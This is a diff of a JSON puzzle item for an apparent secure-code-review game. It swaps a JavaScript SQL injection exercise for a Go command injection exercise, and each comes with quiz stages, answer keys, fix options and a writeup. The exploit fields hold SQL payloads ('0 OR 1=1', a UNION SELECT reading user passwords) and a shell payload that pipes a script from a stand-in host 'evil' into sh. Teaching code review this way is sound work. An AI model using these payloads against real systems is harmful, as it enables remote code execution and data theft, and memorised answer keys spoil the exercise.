@@ -1,52 +1,52 @@
 {
-  "id": "srd-0031",
+  "id": "srd-0034",
   "date": "2026-10-20",
   "difficulty": "easy",
-  "language": "javascript",
+  "language": "go",
   "estimatedMinutes": 5,
   "snippet": {
     "files": [
       {
-        "name": "db.js",
-        "code": "const mysql = require(\"mysql2\");\nconst pool = mysql.createPool({ /* ... */ });\n\nfunction getOrder(orderId, cb) {\n  // Fetch an order by id.\n  const sql = `SELECT * FROM orders WHERE id = ${orderId}`;\n  pool.query(sql, cb);\n}",
+        "name": "git.go",
+        "code": "package main\n\nimport \"os/exec\"\n\n// Clone a repository the user asked for.\nfunc clone(repo string) error {\n\tcmd := exec.Command(\"sh\", \"-c\", \"git clone \"+repo)\n\treturn cmd.Run()\n}",
         "notes": {
-          "4": "Fetches an order; `orderId` comes from the request.",
-          "6": "Builds the SQL with a template literal, interpolating `orderId` into the text.",
-          "7": "Runs the assembled query."
+          "6": "Clones a repository whose URL comes from the user.",
+          "7": "Runs `git clone` via `sh -c`, concatenating `repo` into the shell command string.",
+          "8": "Executes it."
         }
       }
     ]
   },
   "stages": {
     "line": {
-      "file": "db.js",
-      "line": 6,
+      "file": "git.go",
+      "line": 7,
       "yellowRadius": 1,
       "maxGuesses": 5
     },
     "bugClass": {
-      "answer": "sqli",
+      "answer": "command-inj",
       "options": [
-        "sqli",
-        "code-inj",
-        "idor",
         "command-inj",
-        "ssrf"
+        "code-inj",
+        "ssrf",
+        "sqli",
+        "path-traversal"
       ]
     },
     "why": {
       "answerIndex": 2,
       "options": [
         {
-          "label": "Template literals are slower than string concatenation",
-          "whyWrong": "Performance is irrelevant; the interpolation into SQL is the problem."
+          "label": "`git clone` is slow for large repos, blocking the handler",
+          "whyWrong": "Latency isn't the issue; the shell interpreting `repo` is."
         },
         {
-          "label": "`pool.query` reuses connections, which can mix up results",
-          "whyWrong": "Pooling is safe and unrelated to the injection."
+          "label": "`cmd.Run()` doesn't capture output, hiding errors",
+          "whyWrong": "Output handling is unrelated to the injection."
         },
         {
-          "label": "`orderId` is interpolated into the SQL text, so the database parses attacker input as part of the query"
+          "label": "`sh -c` runs a shell and `repo` is concatenated in, so shell metacharacters in it execute as commands"
         }
       ]
     },
@@ -54,23 +54,23 @@
       "answerIndex": 1,
       "options": [
         {
-          "label": "Wrap orderId in quotes in the template",
-          "diff": "-  const sql = `SELECT * FROM orders WHERE id = ${orderId}`;\n+  const sql = `SELECT * FROM orders WHERE id = '${orderId}'`;",
-          "whyWrong": "Still interpolated; `' OR '1'='1` closes the quote and injects."
+          "label": "Wrap repo in quotes in the command",
+          "diff": "-\tcmd := exec.Command(\"sh\", \"-c\", \"git clone \"+repo)\n+\tcmd := exec.Command(\"sh\", \"-c\", \"git clone '\"+repo+\"'\")",
+          "whyWrong": "A quote in `repo` breaks out, and `$()`/backticks still execute inside the shell."
         },
         {
-          "label": "Use a parameterized query with ? and pass orderId as a bound value",
-          "diff": "-  const sql = `SELECT * FROM orders WHERE id = ${orderId}`;\n-  pool.query(sql, cb);\n+  pool.query(\"SELECT * FROM orders WHERE id = ?\", [orderId], cb);"
+          "label": "Call exec.Command(\"git\", \"clone\", repo) with no shell",
+          "diff": "-\tcmd := exec.Command(\"sh\", \"-c\", \"git clone \"+repo)\n+\tcmd := exec.Command(\"git\", \"clone\", repo)"
         },
         {
-          "label": "Remove quotes and semicolons from orderId",
-          "diff": "+  orderId = String(orderId).replace(/['\";]/g, \"\");",
-          "whyWrong": "UNION-based and comment-based payloads need neither quotes nor semicolons."
+          "label": "Remove ';' and '|' from repo",
+          "diff": "+\trepo = strings.NewReplacer(\";\", \"\", \"|\", \"\").Replace(repo)",
+          "whyWrong": "`$()`, backticks, newlines and `&&` still work."
         },
         {
-          "label": "Cast orderId with String()",
-          "diff": "+  orderId = String(orderId);",
-          "whyWrong": "It's already text; casting changes nothing about how the database parses it."
+          "label": "Check that repo starts with https://",
+          "diff": "+\tif !strings.HasPrefix(repo, \"https://\") { return errBad }",
+          "whyWrong": "`https://x$(id)` passes a prefix check and still injects via the shell."
         }
       ]
     }
@@ -81,24 +81,28 @@
     "attribution": "SourceReadle original"
   },
   "training": {
-    "exploit": "Call with `orderId = \"0 OR 1=1\"` to return every order, or `0 UNION SELECT username, password, 1, 1 FROM users` to read other tables. No quotes are even required because the id sits in a numeric context.",
+    "exploit": "Pass `repo = \"https://x; curl http://evil/s | sh\"` or `repo = \"$(id)\"`. The shell runs `git clone https://x`, then the injected command. Dropping `sh -c` and invoking git directly removes the shell entirely.",
     "concepts": [
-      "CWE-89",
+      "CWE-78",
       "OWASP A03:2021"
     ],
     "hints": {
-      "line": "Where does the id become part of the query text?",
-      "bugClass": "The sink is a SQL query.",
-      "why": "Numeric context still lets the input change the query — how?",
-      "fix": "Bind the value with a `?` placeholder."
+      "line": "Which call sends a built string to a shell?",
+      "bugClass": "The input reaches the OS shell.",
+      "why": "Why does `sh -c` make `repo` dangerous?",
+      "fix": "Invoke the binary directly with argument slices."
     }
   },
   "writeup": {
-    "summary": "The template literal splices `orderId` into the SQL string, so the database parses attacker input as query syntax — and numeric contexts need no quotes to exploit (`0 OR 1=1`, `UNION SELECT ...`). A parameterized query (`pool.query(\"... id = ?\", [orderId])`) sends the value as data the driver never treats as SQL. Quoting and character stripping are both bypassable.",
+    "summary": "`exec.Command(\"sh\", \"-c\", \"git clone \"+repo)` runs a shell and concatenates `repo` into the command, so metacharacters execute. Calling `exec.Command(\"git\", \"clone\", repo)` runs git directly with `repo` as a single argument — Go doesn't invoke a shell, so there is nothing to interpret `;`, `$()`, or backticks. Quoting and prefix checks are bypassable.",
     "readNext": [
       {
-        "label": "node-mysql2 prepared statements",
-        "url": "https://github.com/sidorares/node-mysql2#using-prepared-statements"
+        "label": "Go os/exec docs",
+        "url": "https://pkg.go.dev/os/exec"
+      },
+      {
+        "label": "OWASP Command Injection",
+        "url": "https://owasp.org/www-community/attacks/Command_Injection"
       }
     ]
   }
